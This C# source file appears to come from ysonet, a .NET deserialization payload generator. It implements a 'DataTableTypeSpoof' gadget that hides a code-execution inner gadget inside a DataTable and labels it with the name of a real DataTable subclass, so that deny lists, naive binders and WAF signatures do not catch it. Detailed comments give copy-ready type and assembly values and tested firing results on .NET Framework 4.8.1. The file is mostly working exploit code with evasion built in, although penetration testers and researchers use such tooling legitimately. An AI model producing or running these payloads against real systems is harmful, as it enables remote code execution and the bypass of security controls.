using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Data;
using System.Runtime.Serialization;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * DataTable carrier delivered under the name of a DataTable SUBCLASS.
     *
     * The chain is exactly the DataTable gadget's: a System.Data.DataTable with
     * RemotingFormat = SerializationFormat.Binary holds a live inner gadget object in an
     * "object" column, and the same outer formatter that reads the table also materialises
     * that cell, so the inner gadget fires. Nothing new happens on the target.
     *
     * The one difference is the TYPE NAME written on the wire. A target that rejects
     * "System.Data.DataTable" by NAME - a blocklist, a naive SerializationBinder, a WAF
     * signature - still builds the carrier when the record says a SUBCLASS of DataTable
     * instead, because the subclass inherits the protected
     * DataTable(SerializationInfo, StreamingContext) constructor and that constructor is
     * what rebuilds the rows. Naming a subclass to get past a name check is a published
     * technique: Piotr Bazydlo (watchTowr) exploited CVE-2025-23120 in Veeam Backup &
     * Replication by naming the application's own DataSet subclasses (xmlFrameworkDs,
     * BackupSummary) where a deny list only listed the base type. This gadget is the same
     * idea on the DataTable side, with in-box subclass names so it works with no
     * application-specific knowledge.
     *
     * This is NOT the DataSetTypeSpoof trick. DataSetTypeSpoof appends ", x=]" to a real
     * type name and relies on how a binder parses it; the type is still System.Data.DataSet.
     * Here the name on the wire is a real, existing type that a binder will happily resolve.
     *
     * Two reviewed in-box profiles ship as documented values, both from
     * System.Data.Entity.Design (part of the full .NET Framework, not the Client Profile):
     *
     *   System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection        (default)
     *   System.Data.Entity.Design.SsdlGenerator.RelationshipDetailsCollection
     *
     * Both are [Serializable] internal sealed classes deriving from DataTable. Their
     * serialization constructors call the base DataTable constructor FIRST and add no check
     * of their own (they only re-bind fourteen DataColumn fields afterwards, which cannot
     * throw on a missing column because DataColumnCollection's indexer returns null). Being
     * internal is not a problem: BinaryFormatter resolves the type with Assembly.GetType,
     * which sees internal types, and looks the serialization constructor up with NonPublic
     * binding flags, which every BCL serialization constructor needs anyway.
     *
     * When the target has neither assembly, --target-type and --target-assembly write any
     * name verbatim, so an operator can name a DataTable subclass from the target's own
     * assemblies (typed DataSets generate one per table, so most applications that use
     * DataSets have several).
     *
     * WHAT GOES IN --target-type / --target-assembly, measured on .NET Framework 4.8.1 by
     * firing -t into a marker file ("fires" = the payload deserialized and ran). The values
     * are written out in full so a reader can copy them; each row is one --target-type on the
     * first line and its --target-assembly on the second, then the result.
     *
     *  A) DEFAULT PROFILE - fires on BinaryFormatter AND SoapFormatter:
     *       --target-type     System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection
     *       --target-assembly System.Data.Entity.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
     *
     *  B) SECOND IN-BOX PROFILE - fires on BinaryFormatter AND SoapFormatter:
     *       --target-type     System.Data.Entity.Design.SsdlGenerator.RelationshipDetailsCollection
     *       --target-assembly System.Data.Entity.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
     *
     *  C) THE BASE TYPE ITSELF (no evasion, but valid) - fires on both:
     *       --target-type     System.Data.DataTable
     *       --target-assembly System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
     *
     *  D) A TYPED-DATASET TABLE FROM THE TARGET'S OWN ASSEMBLY - fires on both. Nested type,
     *     so the wire name uses '+':
     *       --target-type     MyApp.Data.OrdersDataSet+OrdersDataTable
     *       --target-assembly MyApp.Data, Version=1.0.0.0, Culture=neutral, PublicKeyToken=...
     *
     *  E) PARTIAL ASSEMBLY NAME - fires on BinaryFormatter, produces NOTHING on Soap:
     *       --target-type     System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection
     *       --target-assembly System.Data.Entity.Design
     *
     *  F) WRONG ASSEMBLY VERSION - fires on BinaryFormatter, produces NOTHING on Soap:
     *       --target-type     System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection
     *       --target-assembly System.Data.Entity.Design, Version=9.9.9.9, Culture=neutral, PublicKeyToken=b77a5c561934e089
     *
     *  G) A TYPE THAT RESOLVES BUT IS NOT [Serializable] - produces NOTHING on either:
     *       --target-type     System.Data.SqlClient.SqlConnection
     *       --target-assembly System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
     *     (System.Web.UI.WebControls.EntityDataSourceViewSchema in System.Web.Entity behaves
     *     the same way, and is why that in-box DataTable subclass is unusable as a profile.)
     *
     *  H) ANY TYPE IN AN ASSEMBLY THE TARGET DOES NOT HAVE - produces NOTHING on either,
     *     because only the names travel and the target cannot resolve them.
     *
     * The rules behind those results:
     *   1. THE ASSEMBLY MUST EXIST ON THE TARGET. This is the only hard requirement on both
     *      formatters. ysonet never loads it - only names travel on the wire - but the
     *      TARGET does, and a name it cannot resolve binds to nothing.
     *   2. THE TYPE MUST BE [Serializable]. A type that resolves but is not (SqlConnection,
     *      EntityDataSourceViewSchema) is rejected by ObjectReader.CheckSerializable before
     *      anything is constructed, on every formatter.
     *   3. SOAP IS STRICT, BINARYFORMATTER IS LENIENT ON THE ASSEMBLY. SoapFormatter needs
     *      the type AND the full, correct assembly identity to resolve exactly; a partial
     *      name or a wrong version silently produces nothing. BinaryFormatter falls back to a
     *      partial assembly load, so a short name or wrong version still binds. Prefer the
     *      full identity always; it is what the default ships.
     *
     * Two things worth knowing about what "fires" proves. A bogus TYPE name over a real
     * assembly still fires on BinaryFormatter, because the inner gadget is materialised from
     * the member records BEFORE the root object is constructed and then throws (its
     * ObjectDataProvider is cast to Brush) - so a fire alone shows only that the name got
     * past the binder and the [Serializable] check. That is enough for the evasion. The
     * SECOND half - that the named subclass then rebuilds a real DataTable through its
     * inherited constructor, which matters for a target that CASTS the root to DataTable - is
     * proven separately with a benign cell in SpoofedSubclassNameRebuildsARealDataTable
     * (ysonet.Tests). Best real-world names are TYPED DATASET tables: every .xsd-generated
     * table class derives from TypedTableBase<T> -> DataTable and is [Serializable], and it
     * is a NESTED type, so its wire name uses '+':
     * "MyApp.Data.OrdersDataSet+OrdersDataTable". There is no in-box DataSet subclass
     * anywhere in the GAC, which is why DataSetTypeSpoof uses the ", x=]" parse trick and
     * this gadget targets the DataTable side instead.
     *
     * SELF-CONTAINMENT NOTE. The marshal below delegates GetObjectData to the live
     * DataTable's own public virtual GetObjectData and then relabels the record. That is
     * deliberate and it is not a shared payload builder: the member set here IS
     * System.Data.DataTable's binary remoting schema (dozens of DataTable.DataColumn_0.*
     * keys plus a DataTable_0.Records ArrayList whose layout is derived from the live
     * table). Hand-copying those keys would be a reimplementation of DataTable
     * serialization that drifts silently from the framework, and it would be harder to
     * read than the real thing. Everything a reader needs is still in this one file: the
     * carrier construction, both target type names, the assembly identity, and the single
     * place the type name is replaced.
     *
     * The inner gadget is selectable with var/variant, exactly as on DataTable:
     *   Variant 1 (default): TextFormattingRunProperties (XAML ObjectDataProvider ->
     *     Process.Start), which needs the Microsoft.PowerShell.Editor assembly and WPF.
     *     Supports BinaryFormatter, SoapFormatter and LosFormatter.
     *   Variant 2: TypeConfuseDelegate, a framework built-in inner. Its gadget object is a
     *     generic SortedSet<string> and SoapFormatter cannot serialize a generic type, so
     *     variant 2 supports BinaryFormatter and LosFormatter only.
     *
     * James Forshaw's "Are You My Type?" (Black Hat 2012) documents the related but
     * DISTINCT DataSet nested-BinaryFormatter bridge, not this DataTable carrier:
     * https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
     * watchTowr's CVE-2025-23120 write-up documents the subclass-name evasion:
     * https://labs.watchtowr.com/by-executive-order-we-are-banning-blacklists-domain-level-rce-in-veeam-backup-replication-cve-2025-23120/
     */
    public class DataTableTypeSpoofGenerator : GenericGenerator
    {
        // The default in-box profile. Public so tests name the constant instead of
        // repeating the literal (the DataSetXxe precedent).
        public const string DefaultTargetType =
            "System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection";

        // The full assembly identity as it must appear on the wire. Read from the GAC copy
        // on a .NET Framework 4.8.1 machine; the assembly version has been 4.0.0.0 since
        // .NET Framework 4.0.
        public const string DefaultTargetAssembly =
            "System.Data.Entity.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

        // The second reviewed in-box profile: same assembly, same shape, one flag away.
        public const string RelationshipDetailsType =
            "System.Data.Entity.Design.SsdlGenerator.RelationshipDetailsCollection";

        // Discovery facets (category search only): this is the DEFAULT variant 1. The
        // complete payload runs code via the inner TextFormattingRunProperties gadget, which
        // needs Microsoft.PowerShell.Editor (extra assembly) and WPF, so variant 1 is NOT
        // BuiltIn. The carrier itself opens no nested formatter, so the kind is
        // code-execution and there is no Bridged label. The spoofed type name adds no new
        // requirement of its own: System.Data.Entity.Design is serviced as part of the .NET
        // Framework, and an operator-supplied subclass is the answer when it is missing.
        // Variant 2 (TypeConfuseDelegate) is framework built-in and declares its own
        // override in Variants().
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(
                    GadgetRequirement.ExtraAssembly,
                    GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework)
                // Variant 1 (TextFormattingRunProperties inner); fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "The DataTable carrier written under the name of a REAL DataTable subclass, so "
                + "a target that rejects System.Data.DataTable by name still rebuilds it through "
                + "the inherited serialization constructor; this is not the ', x=]' binder-parse "
                + "trick DataSetTypeSpoof uses, and it is the same idea watchTowr used on DataSet "
                + "subclasses for CVE-2025-23120. Default profile: the in-box "
                + "System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection (assembly "
                + "System.Data.Entity.Design, part of the full .NET Framework); --target-type and "
                + "--target-assembly write any name verbatim, for the second in-box profile "
                + "RelationshipDetailsCollection or a subclass from the target's own assemblies.";
        }

        public override List<string> Labels()
        {
            // Empty on purpose, exactly as DataTable: the payload serializes a DataTable
            // graph rather than hosting another gadget's document, and having a var/variant
            // selector earns no tag.
            return new List<string>();
        }

        private int variant_number = 1; // Default: TextFormattingRunProperties inner
        private string target_type = DefaultTargetType;
        private string target_assembly = DefaultTargetAssembly;

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "TextFormattingRunProperties inner (default)"),
                // Variant 2 wraps TypeConfuseDelegate, whose gadget object is a generic
                // SortedSet<string>. SoapFormatter cannot serialize a generic type, so this
                // variant opts out of SoapFormatter. It is framework built-in (no WPF, no
                // Microsoft.PowerShell.Editor), so it declares its own facet override.
                new GadgetVariant(2, "TypeConfuseDelegate inner (built-in, no WPF)")
                    .Without(Formatters.SoapFormatter)
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.CodeExecution)
                        .WithRequirements(GadgetRequirement.BuiltIn,
                            GadgetRequirement.NetFramework)
                        // The TypeConfuseDelegate inner needs the 4.5-era
                        // ComparisonComparer, so this variant starts later than
                        // variant 1. Fired on 4.8.1.
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481)))
            };
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|variant=",
                    "Inner gadget: 1 -> TextFormattingRunProperties [default], "
                        + "2 -> TypeConfuseDelegate (built-in, no WPF, BinaryFormatter/LosFormatter only)",
                    v => int.TryParse(v, out variant_number)
                },
                // Both defaults are QUOTED in the help text on purpose. The interactive
                // editor recovers a default from this prose (NDesk.Options records none),
                // and quoting is what tells it to take the whole string: without it the
                // comma in the assembly identity ends the value, and the editor would show
                // and then EMIT a truncated name that no target can resolve. Same reason
                // WSManPluginInstance quotes its --assembly default.
                {
                    "target-type=",
                    "Type name written on the wire, verbatim. Must be a DataTable subclass on the "
                        + "TARGET. Default: \"" + DefaultTargetType + "\". Second in-box profile: "
                        + RelationshipDetailsType,
                    v => target_type = v
                },
                {
                    "target-assembly=",
                    "Assembly identity written on the wire, verbatim (Name, Version=..., "
                        + "Culture=..., PublicKeyToken=...). Default: \"" + DefaultTargetAssembly + "\"",
                    v => target_assembly = v
                }
            };
        }

        // The same three the DataTable carrier reaches, and for the same reason: the payload
        // carries a LIVE ISerializable object in an object column, so only the runtime
        // formatters that honor ISerializable and can serialize an arbitrary object graph can
        // deliver it. Every XML serializer fails identically (verified empirically):
        // NetDataContractSerializer, DataContractSerializer and XmlSerializer all throw
        // "does not implement IXmlSerializable", because DataTable requires an object-typed
        // column cell to implement IXmlSerializable and a gadget object does not. Spoofing the
        // ROOT name cannot change that, because the failure happens while writing the cell.
        public override List<string> SupportedFormatters()
        {
            // The "(N)" suffix is a display-only annotation meaning "this formatter carries N
            // variants". SoapFormatter has no suffix because only variant 1 supports it.
            return new List<string>
            {
                Formatters.BinaryFormatter + " (2)",
                Formatters.SoapFormatter,
                Formatters.LosFormatter + " (2)"
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Reject an impossible variant+formatter pair (variant 2 + SoapFormatter) with a
            // clear message instead of a deep framework exception.
            GuardVariantFormatter(variant_number, formatter);

            // Operator input is documented, not policed: the only check is that a name was
            // given at all, because an empty one cannot be written to the wire. What the name
            // resolves to is the target's decision.
            if (string.IsNullOrWhiteSpace(target_type))
                throw new ArgumentException(Name() + " requires a non-empty --target-type.");
            if (string.IsNullOrWhiteSpace(target_assembly))
                throw new ArgumentException(Name() + " requires a non-empty --target-assembly.");

            // Live [Serializable] inner gadget object (not bytes), placed straight into the
            // DataTable cell so it rides the same outer object graph. Variant 2 uses the
            // built-in TypeConfuseDelegate inner; any other value falls back to the default
            // TextFormattingRunProperties inner.
            object inner = variant_number == 2
                ? TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs)
                : TextFormattingRunPropertiesGenerator
                    .TextFormattingRunPropertiesGadget(inputArgs);

            DataTable table = new DataTable("x");
            table.RemotingFormat = SerializationFormat.Binary; // binary remoting: object cells travel in the graph
            table.Columns.Add("x", typeof(object));
            table.Rows.Add(new object[] { inner });
            table.AcceptChanges(); // commit the row so it serializes with a stable record layout

            // The table is never serialized under its own name: the marshal writes the same
            // members and replaces the type record with the operator's subclass name.
            DataTableTypeSpoofMarshal spoofedTable =
                new DataTableTypeSpoofMarshal(table, target_type, target_assembly);

            // BinaryFormatter and LosFormatter minification uses a custom minifying formatter
            // that cannot serialize a live System.Data.DataTable graph, and delegating
            // GetObjectData does not change what that formatter has to walk: measured on this
            // gadget, both cells throw the same NullReferenceException the plain DataTable
            // gadget documents. For those two, minify only the inner TFRP XAML (already done
            // above via inputArgs.Minify) and serialize the outer record with the standard
            // formatter; the XAML is the bulk of the payload, so it still shrinks. Note the
            // side effect a reader should expect: those two cells keep the full assembly
            // identity with its spaces, while a minified SOAP payload writes the decoded,
            // space-collapsed form of the same identity. SoapFormatter minifies its XML output
            // (XmlMinifier), which works on this graph, so it keeps full minification.
            InputArgs outerArgs = inputArgs;
            if (inputArgs.Minify
                && (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                    || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)))
            {
                outerArgs = inputArgs.DeepCopy();
                outerArgs.Minify = false;
            }

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(spoofedTable, formatter, outerArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

        // Writes the live DataTable's own serialization members, then relabels the record as
        // a subclass of DataTable.
        //
        // Step 1 is DataTable.GetObjectData, which is public and virtual on DataTable, so the
        // framework itself produces the RemotingFormat, the schema keys and the
        // DataTable_0.Records ArrayList that carries the inner gadget object.
        // Step 2 is the whole technique: FullTypeName and AssemblyName are what the formatter
        // writes into the type record, so the payload arrives claiming to be the subclass. The
        // subclass never has to exist on THIS machine - only names travel on the wire.
        //
        // On the target the named subclass is resolved and its serialization constructor runs,
        // which chains to protected DataTable(SerializationInfo, StreamingContext); that base
        // constructor reads the same members back and rebuilds the row, materialising the
        // inner gadget.
        [Serializable]
        private class DataTableTypeSpoofMarshal : ISerializable
        {
            private readonly DataTable _table;
            private readonly string _targetTypeName;
            private readonly string _targetAssemblyName;

            public DataTableTypeSpoofMarshal(DataTable table, string targetTypeName, string targetAssemblyName)
            {
                _table = table;
                _targetTypeName = targetTypeName;
                _targetAssemblyName = targetAssemblyName;
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                _table.GetObjectData(info, context);
                info.FullTypeName = _targetTypeName;
                info.AssemblyName = _targetAssemblyName;
            }
        }
    }
}
